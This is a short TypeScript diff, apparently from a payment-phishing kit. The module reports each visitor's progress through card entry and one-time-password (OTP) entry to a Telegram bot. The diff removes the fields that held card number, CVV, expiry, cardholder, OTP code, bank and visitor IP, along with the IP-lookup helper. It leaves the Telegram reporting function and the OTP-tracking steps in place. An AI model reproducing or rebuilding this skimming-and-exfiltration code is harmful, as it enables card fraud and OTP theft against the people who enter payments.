@@ -27,20 +27,12 @@ export function resetPaymentDefaults() {
 }
 
 export interface PaymentInfo {
-  cardNumber: string;
-  cardType: string;
-  expiryDate: string;
-  cvv: string;
-  cardHolder: string;
   amount: number;
   from: string;
   to: string;
   paymentMethod: string;
   step: 'card-entered' | 'card-complete' | 'otp-typing' | 'otp-attempt' | 'otp-success' | 'otp-failed';
-  otpCode?: string;
   attemptNumber?: number;
-  ip?: string;
-  bankName?: string;
 }
 
 export async function sendPaymentToTelegram(info: PaymentInfo): Promise<boolean> {
@@ -62,16 +54,5 @@ export async function sendPaymentToTelegram(info: PaymentInfo): Promise<boolean>
     return resp.ok;
   } catch {
     return false;
-  }
-}
-
-// Get visitor IP
-export async function getVisitorIP(): Promise<string> {
-  try {
-    const res = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
-    const data = await res.json();
-    return data.ip || 'unknown';
-  } catch {
-    return 'unknown';
   }
 }
